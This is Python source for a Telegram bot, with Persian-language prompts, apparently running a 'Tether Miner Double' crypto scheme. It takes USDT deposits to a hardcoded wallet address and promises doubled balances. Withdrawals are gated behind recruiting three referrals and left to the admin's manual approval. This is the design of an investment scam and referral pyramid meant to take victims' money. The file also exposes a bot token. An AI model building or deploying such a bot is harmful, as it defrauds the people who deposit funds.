# imports
import logging
import sqlite3

from telegram import InlineKeyboardButton
from telegram import InlineKeyboardMarkup
from telegram import Update

from telegram.ext import ApplicationBuilder
from telegram.ext import CallbackQueryHandler
from telegram.ext import CommandHandler
from telegram.ext import ContextTypes
from telegram.ext import ConversationHandler
from telegram.ext import MessageHandler
from telegram.ext import filters

# configuration
TOKEN = "8047284110:AAGLIH-VVWRcTlwimcTQy0zimkiiBKY3vxo"
ADMIN_ID = 6644712689
logging.basicConfig(level=logging.INFO)

# database
conn = sqlite3.connect("data.db", check_same_thread=False)
cur = conn.cursor()
cur.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT, username TEXT, balance REAL)")
cur.execute("CREATE TABLE IF NOT EXISTS referrals (referrer_id INTEGER, referred_id INTEGER)")
conn.commit()

# states
DEPOSIT_AMOUNT, DEPOSIT_PROOF, WITHDRAW_AMOUNT, WALLET_ADDRESS, SUPPORT_MESSAGE, ADMIN_REPLY = range(6)

# helpers
def get_referral_link(user_id):
    return f"https://t.me/TetherMinerDouble_Bot?start={user_id}"

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Deposit", callback_data="deposit"),
            InlineKeyboardButton("Withdrawal", callback_data="withdraw"),
            InlineKeyboardButton("Balance", callback_data="balance")
        ],
        [
            InlineKeyboardButton("Referral", callback_data="referral"),
            InlineKeyboardButton("Support", callback_data="support")
        ]
    ])

def back_button(callback_data="menu"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data=callback_data)]])

def get_balance(user_id):
    cur.execute("SELECT balance FROM users WHERE id=?", (user_id,))
    result = cur.fetchone()
    return result[0] if result else 0.0

def update_balance(user_id, amount):
    if get_balance(user_id) == 0.0:
        cur.execute("INSERT OR IGNORE INTO users (id, balance) VALUES (?, ?)", (user_id, 0))
    cur.execute("UPDATE users SET balance = balance + ? WHERE id = ?", (amount, user_id))
    conn.commit()

# handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    cur.execute("INSERT OR IGNORE INTO users (id, name, username, balance) VALUES (?, ?, ?, ?)",
                (user.id, user.full_name, user.username or "", 0.0))
    conn.commit()
    await update.message.reply_text("Welcome to Tether Miner Double!", reply_markup=main_menu_keyboard())

async def handle_referrals(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        referrer_id = int(context.args[0])
        user = update.effective_user
        if user.id != referrer_id:
            cur.execute("INSERT OR IGNORE INTO referrals (referrer_id, referred_id) VALUES (?, ?)", (referrer_id, user.id))
            conn.commit()
            await context.bot.send_message(
                chat_id=referrer_id,
                text=f"کاربر جدید {user.full_name} (@{user.username or 'NoUsername'}) با لینک دعوت شما عضو شد."
            )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "menu":
        await query.message.edit_text("بازگشت به منوی اصلی:", reply_markup=main_menu_keyboard())

    elif query.data == "deposit":
        await query.message.edit_text("چه مقدار دلار می‌خواهید واریز کنید؟", reply_markup=back_button("menu"))
        return DEPOSIT_AMOUNT

    elif query.data == "withdraw":
        cur.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id = ?", (user_id,))
        ref_count = cur.fetchone()[0]
        if ref_count < 3:
            await query.message.edit_text(f"برای برداشت نیاز به حداقل ۳ زیرمجموعه دارید.\nلینک شما: {get_referral_link(user_id)}", reply_markup=back_button())
            return ConversationHandler.END
        await query.message.edit_text("چه مقدار می‌خواهید برداشت کنید؟", reply_markup=back_button("menu"))
        return WITHDRAW_AMOUNT

    elif query.data == "balance":
        await query.message.edit_text(f"موجودی: {get_balance(user_id)} دلار", reply_markup=back_button())

    elif query.data == "referral":
        cur.execute("SELECT COUNT(*) FROM referrals WHERE referrer_id = ?", (user_id,))
        ref_count = cur.fetchone()[0]
        bonus = ref_count * 1.5
        total = get_balance(user_id) + bonus
        await query.message.edit_text(f"زیرمجموعه‌ها: {ref_count}\nپاداش: {bonus} دلار\nموجودی کل: {total} دلار\nلینک دعوت: {get_referral_link(user_id)}", reply_markup=back_button())

    elif query.data == "support":
        await query.message.edit_text("پیام خود را بنویسید:", reply_markup=back_button())
        return SUPPORT_MESSAGE

async def deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        if amount < 5:
            await update.message.reply_text("حداقل واریز ۵ دلار است.")
            return ConversationHandler.END
        context.user_data["deposit_amount"] = amount
        await update.message.reply_text(
            "به آدرس زیر واریز کنید و مدرک ارسال کنید:\n`0xcD3FcEf99251771a3dc1F6Aa992ff23f1824a1bB`",
            reply_markup=back_button("menu"),
            parse_mode="Markdown"
        )
        return DEPOSIT_PROOF
    except ValueError:
        await update.message.reply_text("مقدار نامعتبر است.", reply_markup=back_button("menu"))
        return ConversationHandler.END

async def deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    amount = context.user_data["deposit_amount"]
    proof = update.message.text or (update.message.photo[-1].file_id if update.message.photo else "")
    keyboard = [
        [
            InlineKeyboardButton("تایید", callback_data=f"confirm_deposit:{user.id}:{amount}"),
            InlineKeyboardButton("رد", callback_data=f"reject_deposit:{user.id}")
        ]
    ]
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"درخواست واریز:\nکاربر: {user.full_name} (@{user.username or 'NoUsername'})\nمقدار: {amount}\nمدرک:\n{proof}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    await update.message.reply_text("درخواست شما ثبت شد.")
    return ConversationHandler.END

async def confirm_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _, user_id, amount = update.callback_query.data.split(":")
    update_balance(int(user_id), float(amount) * 2)
    await context.bot.send_message(int(user_id), "واریز تایید شد و موجودی شما دو برابر شد.")
    await update.callback_query.message.delete()

async def reject_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _, user_id = update.callback_query.data.split(":")
    await context.bot.send_message(int(user_id), "واریز شما رد شد.")
    await update.callback_query.message.delete()

async def withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        amount = float(update.message.text)
        user_id = update.effective_user.id
        if amount > get_balance(user_id):
            await update.message.reply_text("موجودی کافی نیست.")
            return ConversationHandler.END
        context.user_data["withdraw_amount"] = amount
        await update.message.reply_text("آدرس کیف پول خود را وارد کنید (BEP20):")
        return WALLET_ADDRESS
    except ValueError:
        await update.message.reply_text("مقدار نامعتبر.")
        return ConversationHandler.END

async def wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    amount = context.user_data["withdraw_amount"]
    address = update.message.text
    keyboard = [
        [
            InlineKeyboardButton("تایید", callback_data=f"confirm_withdraw:{user.id}:{amount}"),
            InlineKeyboardButton("رد", callback_data=f"reject_withdraw:{user.id}")
        ]
    ]
    await context.bot.send_message(
        ADMIN_ID,
        f"درخواست برداشت:\nکاربر: {user.full_name} (@{user.username or 'NoUsername'})\nمقدار: {amount}\nآدرس: {address}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    await update.message.reply_text("درخواست شما ارسال شد.")
    return ConversationHandler.END

async def confirm_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _, user_id, amount = update.callback_query.data.split(":")
    update_balance(int(user_id), -float(amount))
    await context.bot.send_message(int(user_id), "برداشت شما تایید شد.")
    await update.callback_query.message.delete()

async def reject_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _, user_id = update.callback_query.data.split(":")
    await context.bot.send_message(int(user_id), "برداشت شما رد شد.")
    await update.callback_query.message.delete()

async def support_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.message.text
    context.user_data["support_reply_to"] = user.id
    await context.bot.send_message(
        ADMIN_ID,
        f"پیام از {user.full_name} (@{user.username or 'NoUsername'}):\n{msg}",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("پاسخ", callback_data=f"reply_support:{user.id}")]])
    )
    await update.message.reply_text("پیام شما ارسال شد.")
    return ConversationHandler.END

async def reply_support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(update.callback_query.data.split(":")[1])
    context.user_data["reply_user"] = user_id
    await update.callback_query.message.reply_text("پاسخ خود را وارد کنید:")
    return ADMIN_REPLY

async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = context.user_data.get("reply_user")
    if user_id:
        await context.bot.send_message(user_id, f"پاسخ ادمین:\n{text}")
        await update.message.reply_text("پاسخ ارسال شد.")
    return ConversationHandler.END

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button)],
        states={
            DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_amount)],
            DEPOSIT_PROOF: [MessageHandler(filters.ALL, deposit_proof)],
            WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_amount)],
            WALLET_ADDRESS: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_address)],
            SUPPORT_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, support_message)],
            ADMIN_REPLY: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_reply)],
        },
        fallbacks=[]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("start", handle_referrals))
    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(confirm_deposit, pattern=r"^confirm_deposit:"))
    app.add_handler(CallbackQueryHandler(reject_deposit, pattern=r"^reject_deposit:"))
    app.add_handler(CallbackQueryHandler(confirm_withdraw, pattern=r"^confirm_withdraw:"))
    app.add_handler(CallbackQueryHandler(reject_withdraw, pattern=r"^reject_withdraw:"))
    app.add_handler(CallbackQueryHandler(reply_support, pattern=r"^reply_support:"))
    app.add_handler(CallbackQueryHandler(button))

    app.run_polling()

if __name__ == "__main__":
    main()
